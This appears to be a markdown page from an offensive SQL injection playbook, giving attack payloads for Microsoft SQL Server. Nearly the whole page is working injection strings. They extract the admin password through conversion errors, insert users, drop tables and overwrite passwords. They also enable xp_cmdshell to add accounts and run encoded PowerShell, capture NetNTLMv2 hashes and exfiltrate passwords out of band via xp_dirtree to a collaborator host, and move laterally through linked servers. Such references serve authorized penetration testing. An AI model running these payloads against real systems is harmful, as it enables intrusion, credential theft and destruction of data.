# Per-DBMS Reference — Microsoft SQL Server

## When this applies

- DBMS fingerprint indicates MSSQL. Quick check:
  ```sql
  ' UNION SELECT NULL--
  ' WAITFOR DELAY '0:0:5'--
  SELECT @@version--
  ```
- Error messages mention `Incorrect syntax near` or `Conversion failed when converting`.

## Technique

MSSQL stacked queries are fully supported and unlock OS command execution via `xp_cmdshell` (when sysadmin or after `sp_configure`/`RECONFIGURE`). Time delays use `WAITFOR`. String concatenation uses `+`. Out-of-band via `xp_dirtree` UNC paths.

## Steps

### Comment syntax

```sql
--          # Single-line
/*...*/     # Multi-line
```

### Concatenation

```sql
'foo' + 'bar'                    # 'foobar' (string)
'1' + '2'                        # '12'
1 + 2                            # 3 (numeric — beware type confusion)
CONCAT('foo','bar')              # MSSQL 2012+
```

### Version / current user

```sql
SELECT @@version
SELECT SYSTEM_USER
SELECT USER_NAME()
SELECT DB_NAME()
SELECT HOST_NAME()
```

### Schema enumeration

```sql
SELECT name FROM master..sysdatabases
SELECT table_name FROM information_schema.tables
SELECT name FROM sysobjects WHERE xtype='U'              -- legacy
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### Time delay

```sql
WAITFOR DELAY '0:0:10'
IF (1=1) WAITFOR DELAY '0:0:10'
IF (LEN(password)>5) WAITFOR DELAY '0:0:10' FROM users WHERE username='admin'
```

### Error-based extraction

```sql
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT password FROM users WHERE username='admin'))--
```

Error: `Conversion failed when converting the nvarchar value 'PASSWORD' to data type int.` — value leaked.

### Substring / length

```sql
SUBSTRING(s, p, l)
LEN(s)                                    # MSSQL uses LEN, not LENGTH
```

### Stacked queries (FULLY supported)

```sql
'; INSERT INTO users VALUES ('hacker','password123')--
'; DROP TABLE users--                     -- destructive, only in authorized labs
'; UPDATE users SET password='hacked' WHERE username='admin'--
```

### `xp_cmdshell` OS command execution

When sysadmin (or `sp_configure` rights):

```sql
-- One-shot enable + execute
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
   EXEC xp_cmdshell 'whoami'--

-- Execute with output capture
'; EXEC xp_cmdshell 'whoami' WITH RESULT SETS ((output VARCHAR(100)))--

-- Add user / spawn shell
'; EXEC xp_cmdshell 'net user hacker P@ss /add'--
'; EXEC xp_cmdshell 'powershell -enc <base64>'--

-- Check if already enabled
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
```

### Alternative: OLE Automation Procedures

```sql
EXEC sp_oacreate 'wscript.shell', @shell OUT;
EXEC sp_oamethod @shell, 'run', NULL, 'cmd /c whoami > C:\output.txt';
```

Requires `Ole Automation Procedures` config to be enabled.

### Out-of-band via `xp_dirtree` (NetNTLMv2 capture)

```sql
exec master..xp_dirtree '//COLLABORATOR/a'
```

Triggers SMB connection — captures NetNTLMv2 hash of the SQL service account on a Responder/impacket-smbserver listener.

### Out-of-band exfiltration

```sql
'; exec master..xp_dirtree '//' + (SELECT password FROM users WHERE username='administrator') + '.COLLABORATOR/a'--
```

### Linked servers (lateral movement)

```sql
SELECT * FROM master..sysservers
EXEC ('SELECT name FROM sys.databases') AT [LinkedServer]
EXEC ('xp_cmdshell ''whoami''') AT [LinkedServer]
```

When the linked server has `is_remote_login` and uses fixed credentials with sysadmin rights, you get SYSTEM-level command execution on the remote box.

### File operations

```sql
BULK INSERT temp FROM 'C:\path\to\file.txt'
EXEC xp_cmdshell 'type C:\path\to\file.txt'
EXEC xp_cmdshell 'dir C:\\'
```

### Common variants / aliases

```sql
+   string concat (or numeric add depending on type)
%   modulo
&   bitwise AND
||  NOT supported as concat (would be string OR-ish — type error)
```

## Verifying success

- `SELECT @@version` returns `Microsoft SQL Server 2019 (RTM-CU16) ...`.
- `WAITFOR DELAY '0:0:10'` reliably delays response.
- `xp_cmdshell 'whoami'` returns service account (`nt service\mssqlserver` or domain account).

## Common pitfalls

- `xp_cmdshell` requires sysadmin OR explicit grant; default-installed and disabled. Check `sys.configurations` first.
- `RECONFIGURE` may need to be called twice on some versions to take effect.
- `xp_dirtree` requires `xp_cmdshell` privilege equivalent on hardened deployments — try `xp_fileexist` as alternate OAST primitive.
- MSSQL kerberos service account often has very limited filesystem access — `whoami` works but file writes fail.
- Linked server `EXECUTE AS LOGIN='sa'` is the common privesc primitive; check `is_remote_login` flags.

## Tools

- sqlmap `--dbms=MSSQL --os-shell` automates `xp_cmdshell` enable + shell.
- `mssqlclient.py` (impacket) for direct interactive shell once you have credentials.
- `PowerUpSQL` for linked-server / privesc enumeration.
- See `system/scenarios/mssql/xp-cmdshell.md` for post-exploitation playbook.
